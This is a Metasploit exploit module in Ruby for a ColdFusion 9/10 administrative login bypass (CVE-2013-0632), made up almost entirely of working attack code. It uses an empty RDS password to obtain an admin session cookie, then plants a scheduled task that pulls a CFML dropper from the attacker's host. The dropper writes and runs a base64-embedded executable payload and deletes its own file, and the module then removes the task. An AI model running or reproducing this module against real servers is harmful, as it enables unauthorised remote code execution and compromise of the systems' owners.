 
class Metasploit3 < Msf::Exploit::Remote
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE
 
  Rank = GreatRanking
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;Adobe ColdFusion 9 Administrative Login Bypass&#039;,
      &#039;Description&#039;     => %q{
      Adobe ColdFusion 9.0, 9.0.1, 9.0.2, and 10 allows remote attackers to bypass authentication using the RDS component. Its password can
      by default or by misconfiguration be set to an empty value. This allows you to create a session via the RDS login that
      can be carried over to the admin web interface even though the passwords might be different. Therefore bypassing
      authentication on the admin web interface which then could lead to arbitrary code execution.
      Tested on Windows and Linux with ColdFusion 9.
      },
      &#039;Author&#039;          =>
        [
          &#039;Scott Buckel&#039;, # Vulnerability discovery
          &#039;Mekanismen <mattias[at]gotroot.eu>&#039; # Metasploit module
        ],
      &#039;License&#039;         => MSF_LICENSE,
      &#039;References&#039;      =>
        [
          [ "CVE", "2013-0632" ],
          [ "EDB", "27755" ],
          [ "URL", "http://www.adobe.com/support/security/bulletins/apsb13-03.html" ]
        ],
      &#039;Privileged&#039;      => false,
      &#039;Stance&#039;          => Msf::Exploit::Stance::Aggressive, #thanks juan!
      &#039;Platform&#039;        => [&#039;win&#039;, &#039;linux&#039;],
      &#039;Targets&#039;         =>
        [
         [ &#039;Windows&#039;,
            {
            &#039;Arch&#039; => ARCH_X86,
            &#039;Platform&#039; => &#039;win&#039;
            }
          ],
          [ &#039;Linux&#039;,
            {
            &#039;Arch&#039; => ARCH_X86,
            &#039;Platform&#039; => &#039;linux&#039;
            }
          ],
        ],
      &#039;DefaultTarget&#039;   => 0,
      &#039;DisclosureDate&#039;  => &#039;Aug 08 2013&#039;
    ))
 
    register_options(
      [
        OptString.new(&#039;EXTURL&#039;, [ false, &#039;An alternative host to request the CFML payload from&#039;, "" ]),
        OptInt.new(&#039;HTTPDELAY&#039;, [false, &#039;Time that the HTTP Server will wait for the payload request&#039;, 10]),
      ], self.class)
 
    register_advanced_options(
      [
        OptString.new(&#039;CFIDDIR&#039;, [ true, &#039;Alternative CFIDE directory&#039;, &#039;CFIDE&#039;])
      ])
  end
 
  def check
    uri = target_uri.path
 
    #can we access the admin interface?
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(uri, datastore[&#039;CFIDDIR&#039;], &#039;administrator&#039;, &#039;index.cfm&#039;),
    })
 
    if res and res.code == 200 and res.body.to_s =~ /ColdFusion Administrator Login/
       print_good "#{peer} - Administrator access available"
    else
      return Exploit::CheckCode::Safe
    end
 
    #is it cf9?
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(uri, datastore[&#039;CFIDDIR&#039;], &#039;administrator&#039;, &#039;images&#039;, &#039;loginbackground.jpg&#039;)
    })
 
    img = Rex::Text.md5(res.body.to_s)
    imghash = "596b3fc4f1a0b818979db1cf94a82220"
 
    if img == imghash
      print_good "#{peer} - ColdFusion 9 Detected"
    else
      return Exploit::CheckCode::Safe
    end
 
    #can we access the RDS component?
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(uri, datastore[&#039;CFIDDIR&#039;], &#039;adminapi&#039;, &#039;administrator.cfc&#039;),
      &#039;vars_post&#039; => {
          &#039;method&#039; => "login",
          &#039;adminpassword&#039; => "",
          &#039;rdsPasswordAllowed&#039; => "1"
       }
    })
 
    if res and res.code == 200 and res.body.to_s =~ /true/
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end
 
  def exploit
    @pl           = gen_file_dropper
    @payload_url  = ""
 
    if datastore[&#039;EXTURL&#039;].blank?
      begin
        Timeout.timeout(datastore[&#039;HTTPDELAY&#039;]) {super}
      rescue Timeout::Error
      end
      exec_payload
    else
      @payload_url = datastore[&#039;EXTURL&#039;]
      upload_payload
      exec_payload
    end
  end
 
  def primer
    @payload_url = get_uri
    upload_payload
  end
 
  def on_request_uri(cli, request)
    if request.uri =~ /#{get_resource}/
      send_response(cli, @pl)
    end
  end
 
  #instead we use a CFML filedropper to embed our payload and execute it.
  #this also removes the dependancy of using the probe.cfm to execute the file.
 
  def gen_file_dropper
    rand_var    = rand_text_alpha(8+rand(8))
    rand_file   = rand_text_alpha(8+rand(8))
 
    if datastore[&#039;TARGET&#039;] == 0
      rand_file += ".exe"
    end
 
    encoded_pl  = Rex::Text.encode_base64(generate_payload_exe)
 
    print_status "Building CFML shell..."
    #embed payload
    shell = ""
    shell += " <cfset #{rand_var} = ToBinary( \"#{encoded_pl}\" ) />"
    shell += " <cffile action=\"write\" output=\"##{rand_var}#\""
    shell += " file= \"#GetDirectoryFromPath(GetCurrentTemplatePath())##{rand_file}\""
    #if linux set correct permissions
    if datastore[&#039;TARGET&#039;] == 1
      shell += " mode = \"700\""
    end
    shell += "/>"
    #clean up our evil .cfm
    shell += " <cffile action=\"delete\""
    shell += " file= \"#GetDirectoryFromPath(GetCurrentTemplatePath())##listlast(cgi.script_name,\"/\")#\"/>"
    #execute our payload!
    shell += " <cfexecute"
    shell += " name = \"#GetDirectoryFromPath(GetCurrentTemplatePath())##{rand_file}\""
    shell += " arguments = \"\""
    shell += " timeout = \"60\"/>"
 
    return shell
  end
 
  def exec_payload
    uri = target_uri.path
 
    print_status("#{peer} - Our payload is at: #{peer}\\#{datastore[&#039;CFIDDIR&#039;]}\\#{@filename}")
    print_status("#{peer} - Executing payload...")
 
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(uri, datastore[&#039;CFIDDIR&#039;], @filename)
    })
  end
 
  def upload_payload
    uri = target_uri.path
 
    @filename = rand_text_alpha(8+rand(8)) + ".cfm" #numbers is a bad idea
    taskname = rand_text_alpha(8+rand(8)) #numbers is a bad idea
 
    print_status "#{peer} - Trying to upload payload via scheduled task..."
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(uri, datastore[&#039;CFIDDIR&#039;], &#039;adminapi&#039;, &#039;administrator.cfc&#039;),
      &#039;vars_post&#039; => {
          &#039;method&#039; => "login",
          &#039;adminpassword&#039; => "",
          &#039;rdsPasswordAllowed&#039; => "1"
       }
    })
 
    unless res and res.code == 200
      fail_with(Failure::Unknown, "#{peer} - RDS component was unreachable")
    end
 
    cookie = res.get_cookies
 
    if res and res.code == 200 and cookie =~ /CFAUTHORIZATION_cfadmin=;(.*)/
      cookie = $1
    else
      fail_with(Failure::Unknown, "#{peer} - Unable to get auth cookie")
    end
 
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(uri, datastore[&#039;CFIDDIR&#039;], &#039;administrator&#039;, &#039;index.cfm&#039;),
      &#039;cookie&#039; => cookie
    })
 
    if res and res.code == 200 and res.body.to_s =~ /ColdFusion Administrator Login/
      print_good("#{peer} - Logged in as Administrator!")
    else
      fail_with(Failure::Unknown, "#{peer} - Login Failed")
    end
 
    #get file path gogo
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(uri, datastore[&#039;CFIDDIR&#039;], &#039;administrator&#039;, &#039;settings&#039;, &#039;mappings.cfm&#039;),
      &#039;vars_get&#039; => {
        &#039;name&#039; => "/CFIDE"
      },
      &#039;cookie&#039; => cookie
    })
 
    unless res and res.code == 200
      fail_with(Failure::Unknown, "#{peer} - Mappings URL was unreachable")
    end
 
    if res.body =~ /<input type="text" maxlength="550" name="directoryPath" value="(.*)" size="40" id="dirpath">/
      file_path = $1
      print_good("#{peer} - File path disclosed! #{file_path}")
    else
      fail_with(Failure::Unknown, "#{peer} - Unable to get upload filepath")
    end
 
    print_status("#{peer} - Adding scheduled task")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(uri, datastore[&#039;CFIDDIR&#039;], &#039;administrator&#039;, &#039;scheduler&#039;, &#039;scheduleedit.cfm&#039;),
      &#039;vars_post&#039; => {
        &#039;TaskName&#039; => taskname,
        &#039;Start_Date&#039; => "Nov 1, 2420",
        &#039;End_Date&#039; => "",
        &#039;Interval&#039; => "",
        &#039;ScheduleType&#039; => "Once",
        &#039;Operation&#039; => "HTTPRequest",
        &#039;ScheduledURL&#039; => @payload_url,
        &#039;publish&#039; => "1",
        &#039;publish_file&#039; => "#{file_path}\\#{@filename}",
        &#039;adminsubmit&#039; => "Submit"
      },
      &#039;cookie&#039; => cookie
    })
 
    unless res and res.code == 200 or res.code == 302 #302s can happen but it still works, http black magic!
      fail_with(Failure::Unknown, "#{peer} - Scheduled task failed")
    end
 
    print_status("#{peer} - Running scheduled task")
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(uri, datastore[&#039;CFIDDIR&#039;], &#039;administrator&#039;, &#039;scheduler&#039;, &#039;scheduletasks.cfm&#039;),
      &#039;vars_get&#039; => {
        &#039;runtask&#039; => taskname,
        &#039;timeout&#039; => "0"
      },
      &#039;cookie&#039; => cookie
      })
 
    if res and res.code == 200 and res.body.to_s =~ /This scheduled task was completed successfully/
      print_good("#{peer} - Scheduled task completed successfully")
    else
      fail_with(Failure::Unknown, "#{peer} - Scheduled task failed")
    end
 
    print_status("#{peer} - Deleting scheduled task")
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(uri, datastore[&#039;CFIDDIR&#039;], &#039;administrator&#039;, &#039;scheduler&#039;, &#039;scheduletasks.cfm&#039;),
      &#039;vars_get&#039; => {
        &#039;action&#039; => "delete",
        &#039;task&#039; => taskname
      },
      &#039;cookie&#039; => cookie
    })
 
    unless res and res.code == 200
      print_error("#{peer} - Scheduled task deletion failed, cleanup might be needed!")
    end
  end
end

